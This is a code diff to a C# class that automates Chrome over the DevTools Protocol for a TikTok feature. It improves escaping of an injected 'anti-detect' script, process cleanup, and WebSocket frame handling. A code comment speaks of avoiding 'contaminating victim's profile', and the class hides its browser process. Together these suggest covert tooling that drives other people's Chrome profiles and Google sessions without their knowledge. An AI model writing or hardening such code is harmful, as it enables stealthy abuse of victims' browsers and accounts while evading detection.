@@ -183,7 +183,10 @@ internal static class TikTokCdpFeature
             await ws.SendAsync("Target.setDiscoverTargets", "{\"discover\":true}", ct);
 
             // Inject anti-detect script on every new page load
-            var escapedAntiDetect = AntiDetectScript.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n");
+            var escapedAntiDetect = AntiDetectScript
+            .Replace("\\", "\\\\").Replace("\"", "\\\"")
+            .Replace("\r", "\\r").Replace("\n", "\\n")
+            .Replace("\t", "\\t").Replace("\b", "\\b").Replace("\f", "\\f");
             await ws.SendAsync("Page.addScriptToEvaluateOnNewDocument",
                 $"{{\"source\":\"{escapedAntiDetect}\"}}", ct);
 
@@ -346,7 +349,7 @@ internal static class TikTokCdpFeature
         finally
         {
             hideCts.Cancel();
-            try { proc.Kill(entireProcessTree: true); } catch { }
+            try { proc.Kill(entireProcessTree: true); proc.WaitForExit(3000); } catch { }
         }
     }
 
@@ -405,7 +408,15 @@ internal static class TikTokCdpFeature
             while (!cts2.Token.IsCancellationRequested)
             {
                 var text = await ReadFrameAsync(cts2.Token);
-                if (text.Contains($"\"id\":{id}")) return text;
+                if (string.IsNullOrEmpty(text)) continue;
+                try
+                {
+                    using var jd = JsonDocument.Parse(text);
+                    if (jd.RootElement.TryGetProperty("id", out var idEl)
+                        && idEl.TryGetInt32(out int respId) && respId == id)
+                        return text;
+                }
+                catch { }
             }
             return "";
         }
@@ -528,8 +539,8 @@ internal static class TikTokCdpFeature
                 while (rem > 0) { int n = (int)Math.Min(rem, skip.Length); await ReadExactAsync(skip, 0, n, ct); rem -= n; }
             }
 
-            if (opcode == 8) return "";
-            if (opcode == 9) { await WritePongAsync(buf, len, ct); return ""; }
+            if (opcode == 8) throw new Exception("WebSocket closed by remote");
+            if (opcode == 9) { await WritePongAsync(buf, len, ct); return await ReadFrameAsync(ct); }
 
             return Encoding.UTF8.GetString(buf, 0, len);
         }
@@ -662,7 +673,7 @@ internal static class TikTokCdpFeature
                 return userDataDir;
         }
         catch { }
-        return userDataDir;
+        return null; // No Google account signed in — launch Chrome fresh to avoid contaminating victim's profile
     }
 
     private static int GetFreePort()
